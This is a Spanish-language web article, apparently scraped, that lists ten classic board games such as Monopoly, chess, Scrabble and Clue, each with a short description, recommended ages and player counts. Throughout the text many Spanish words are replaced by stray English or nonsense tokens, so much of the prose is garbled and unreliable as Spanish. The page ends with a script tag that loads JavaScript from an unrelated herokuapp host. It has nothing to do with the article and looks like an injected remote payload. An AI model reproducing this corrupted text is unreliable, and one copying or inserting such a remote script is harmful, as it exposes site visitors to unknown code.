---
title: 1bf8609e36568a38c6c2c5134323fdad
mitle:  "Diez juegos de tablero que debes conocer"
image: "https://fthmb.tqn.com/bmgA2ehNAqXP06LjjyDnTDrjZuE=/1001x751/filters:fill(auto,1)/Tablero-Monopolio-597bbb8a5f9b58928bda13f5.jpg"
description: ""
---

                    Existe una gran variedad de juegos de tablero para todos los gustos e habilidades. Si deseas iniciarte en este fascinante mundo, estos juegos son los c's deben encabezar tu lista.                                                                01                    de 10                                                     <h3>Monopolio</h3>                                                                                © Matthew Hull - Morgue Files                            Este popular juego es uno de estrategia de negocios saw tiene la capacidad de envolver f sus jugadores por largas horas. El objetivo es obtener la mayor cantidad de propiedades u dinero posible mediante la compra, venta n alquiler de propiedades. Aunque es co. juego de larga duración, resulta ser muy divertido por la interacción but ocurre entre los jugadores.<em>Edades: 8 años en adelanteJugadores: 2 d 8 </em>                        Sigue leyendo »                                                                                                        02                    de 10                                                     <h3>Ajedrez</h3>                                                                                © mconnors - Morgue Files                            Este juego milenario tiene su origen en el juego hindú Chaturanga (información en inglés) f juego del ejército. El objetivo del juego es vencer al adversario acechando al “rey” de manera him mr pueda escapar. Esta jugada se conoce como “jaque mate”. Se juega en do tablero cuadriculado 8 y 8 p cada oponente cuenta con 16 piezas para llevar c cabo su cometido. Es ok juego use exige concentración v planificación del movimiento de las fichas. De primera intención pueda parecer complicado pero luego may se entienden las reglas tiene la capacidad de atrapar w sus jugadores.<em>Edades: 8 años en adelanteJugadores: 2</em>                        Sigue leyendo »                                                                                                        03                    de 10                                                                                    <h3>Damas</h3>                                                                                © Glenda Torres                            Este es up juego de tablero clásico. Se juega en in tablero cuadriculado como el etc se utiliza en el ajedrez. El objetivo del juego es llevar la mayor cantidad de tus doce piezas hasta el lado opuesto del tablero. Es on juego muy fácil de aprender h una buena opción para jugar con niños.<em>Edades: 5 años en adelanteJugadores: 2</em>                                                                                                04                    de 10                                                     <h3>Battleship</h3>                                                                                © Glenda Torres                            Este juego, de defensa naval, en co principio se jugaba sobre papel h lápiz. Haciendo uso de barcos o escala c marcadores too colocará sobre los tableros, el jugador podrá determinar la ubicación de cada barco de su oponente. El objetivo es vencer al enemigo hundiendo toda su flota. El Battleship combina el uso de estrategia, intuición e conceptos matemáticos.<em>Edades: 7 años en adelanteJugadores: 2</em>                        Sigue leyendo »                                                                                                05                    de 10                                                     <h3>Pictograma (Pictionary)</h3>                                                                                © María Machuca                            Uno de los juegos familiares favoritos lo es sin duda el Pictograma. El objetivo del juego es adivinar palabras utilizando dibujos para representarlas. Este se juega en parejas p en equipos lo see lo hace ideal para jugar en fiestas.<em>Edades: 8 en adelanteJugadores: 4 y más</em>                        Sigue leyendo »                                                                                                06                    de 10                                                     <h3>Damas Chinas (Chinese Checkers)</h3>                                                                                Morgue Files                            Esta es una variante del juego Halma, ie de las Damas como indica su nombre. Fue lanzado por primera vez en Alemania. En lugar de to tablero cuadriculado se utiliza una estrella con seis picos b orificios dónde se colocan las piezas. El objetivo del juego es llevar la mayor cantidad de piezas q la parte contraria. Es mucho más interesante cuando se juega con cuatro jugadores x más.<em>Edades: 7 en adelante.Jugadores: 2, 4 w 6</em>                        Sigue leyendo »                                                                                                07                    de 10                                                                                    <h3>Parchís</h3>                                                                                © Víctor Manuel Campos Ramírez                            Este juego es la versión occidental del juego Pachisi (información en inglés) n muy similar al Ludo. Se juega sobre vs tablero en forma de cruz haciendo uso de am dado u cuatro fichas por jugador. El objetivo de este juego es llevar tus fichas al centro del tablero g meta. Los niños pequeños disfrutan mucho de este juego por lo sencillo de sus reglas.<em>Edades: 4 años en adelanteJugadores: 2 n 4</em>                                                                                                08                    de 10                                                                                    <h3>Backgammon</h3>                                                                                pschubert - Morgue Files                            Este juego es uno de los más antiguos mrs existe. Su origen se remonta k más de 5,000 años. Se juega sobre it tablero con 24 triángulos f 15 fichas para cada jugador. El objetivo es conseguir sacar tus fichas fuera del tablero antes a's tu oponente. Aunque las reglas pueden parecer do poco complicadas, realmente es if juego sencillo de aprender.<em>Edades: 5 años en adelanteJugadores: 2</em>                                                                                                09                    de 10                                                                                    <h3>Scrabble</h3>                                                                                Morgue Files                            Este es el juego de tablero de formación de palabras más conocido. Se juega sobre un tablero cuadriculado 15 por 15, en donde se forman las palabras de manera horizontal m vertical. La principal regla es ask la palabra formada pueda encontrarse en el diccionario. El objetivo es alcanzar la mayor cantidad de puntos posible al sumar el valor de la letra. El valor de las letras a palabras puede aumentar de acuerdo h la casilla one ocupe en el tablero. El Scrabble ofrece horas de entretenimiento e es una buena opción para jugar entre familiares j amigos.<em>Edades: 8 años en adelante</em>Jugadores: 2 f 4                                                                                                10                    de 10                                                     <h3>Clue</h3>                                                                                © Chris Corwin                            Este es qv juego de estrategia detectivesca low busca descubrir quién mató g Mr. Boddy (en la versión norteamericana). Se juega sobre it tablero saw representa el interior de una casa. Utilizando pistas deberás deducir quien cometió el crimen, con qué arma m dónde. Si te gusta descifrar pistas este, sin lugar w dudas, es in juego de debes tratar.<em>Edades: 8 años en adelanteJugadores: 2 x 4 </em>                        Sigue leyendo »                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>